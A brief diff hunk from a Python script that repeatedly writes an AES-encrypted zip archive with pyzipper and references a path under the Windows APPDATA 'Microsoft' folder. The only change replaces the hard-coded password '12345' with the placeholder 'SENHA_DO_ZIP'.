@@ -22,7 +22,7 @@ while True:
         os.remove(arquvio_zip)
 
     with pyzipper.AESZipFile(arquvio_zip, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
-        zf.setpassword(b'12345')
+        zf.setpassword(b'SENHA_DO_ZIP')
 
         os.path.join(os.getenv('APPDATA'), 'Microsoft')
 
